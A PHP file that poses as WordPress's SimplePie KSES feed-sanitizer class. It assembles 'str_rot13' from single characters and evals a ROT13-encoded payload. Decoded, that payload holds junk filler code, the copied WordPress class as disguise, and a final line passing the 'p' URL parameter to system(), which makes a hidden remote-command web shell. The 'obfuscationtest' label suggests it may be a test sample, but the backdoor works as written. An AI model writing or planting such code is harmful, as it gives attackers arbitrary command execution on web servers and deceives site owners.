<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Srrq NCV: JC_FvzcyrCvr_Fnavgvmr_XFRF pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Srrq
 * @fvapr 4.7.0
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

/**
 * Pber pynff hfrq gb vzcyrzrag FvzcyrCvr srrq fnavgvmngvba.
 *
 * Rkgraqf gur FvzcyrCvr\Fnavgvmr pynff gb hfr XFRF, orpnhfr
 * jr pnaabg havirefnyyl pbhag ba QBZQbphzrag orvat ninvynoyr.
 *
 * @fvapr 3.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_FvzcyrCvr_Fnavgvmr_XFRF rkgraqf FvzcyrCvr\Fnavgvmr {

	/**
	 * JbeqCerff FvzcyrCvr fnavgvmngvba hfvat XFRF.
	 *
	 * Fnavgvmrf gur vapbzvat qngn, gb rafher gung vg zngpurf gur glcr bs qngn rkcrpgrq, hfvat XFRF.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz zvkrq   $qngn Gur qngn gung arrqf gb or fnavgvmrq.
	 * @cnenz vag     $glcr Gur glcr bs qngn gung vg'f fhccbfrq gb or.
	 * @cnenz fgevat  $onfr Bcgvbany. Gur `kzy:onfr` inyhr gb hfr jura pbairegvat eryngvir
	 *                      HEYf gb nofbyhgr barf. Qrsnhyg rzcgl.
	 * @erghea zvkrq Fnavgvmrq qngn.
	 */
	choyvp shapgvba fnavgvmr( $qngn, $glcr, $onfr = '' ) {
		$qngn = gevz( $qngn );
		vs ( $glcr & FvzcyrCvr\FvzcyrCvr::PBAFGEHPG_ZNLOR_UGZY ) {
			vs ( cert_zngpu( '/(&(#(k[0-9n-sN-S]+|[0-9]+)|[n-mN-M0-9]+)|<\/[N-Mn-m][^\k09\k0N\k0O\k0P\k0Q\k20\k2S\k3R]*' . FVZCYRCVR_CPER_UGZY_NGGEVOHGR . '>)/', $qngn ) ) {
				$glcr |= FvzcyrCvr\FvzcyrCvr::PBAFGEHPG_UGZY;
			} ryfr {
				$glcr |= FvzcyrCvr\FvzcyrCvr::PBAFGEHPG_GRKG;
			}
		}
		vs ( $glcr & FvzcyrCvr\FvzcyrCvr::PBAFGEHPG_ONFR64 ) {
			$qngn = onfr64_qrpbqr( $qngn );
		}
		vs ( $glcr & ( FvzcyrCvr\FvzcyrCvr::PBAFGEHPG_UGZY | \FvzcyrCvr\FvzcyrCvr::PBAFGEHPG_KUGZY ) ) {
			$qngn = jc_xfrf_cbfg( $qngn );
			vs ( 'HGS-8' !== $guvf->bhgchg_rapbqvat ) {
				$qngn = $guvf->ertvfgel->pnyy( 'Zvfp', 'punatr_rapbqvat', neenl( $qngn, 'HGS-8', $guvf->bhgchg_rapbqvat ) );
			}
			erghea $qngn;
		} ryfr {
			erghea cnerag::fnavgvmr( $qngn, $glcr, $onfr );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>